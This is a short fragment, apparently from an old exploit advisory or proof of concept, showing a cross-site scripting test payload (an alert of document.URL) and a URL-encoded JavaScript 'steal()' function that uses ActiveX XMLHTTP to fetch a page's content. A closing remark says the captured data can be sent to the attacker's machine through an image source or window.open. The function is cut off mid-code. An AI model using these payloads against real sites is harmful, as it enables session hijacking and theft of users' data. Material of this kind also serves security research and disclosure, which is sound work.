<html>
<script>alert(document.URL)</script>
</html>

The following script code has been provided to demonstrate indirect session hijacking using web redirection:

function%20steal(){var%20xmlHttp%20=%20new%20ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open("GET","<URL_to_spoof>",false);xmlHttp.send();xmlDoc=xmlHttp.responseText;

"xmldoc" can be redirected with a "img src", "window.open", to the attacker machine.
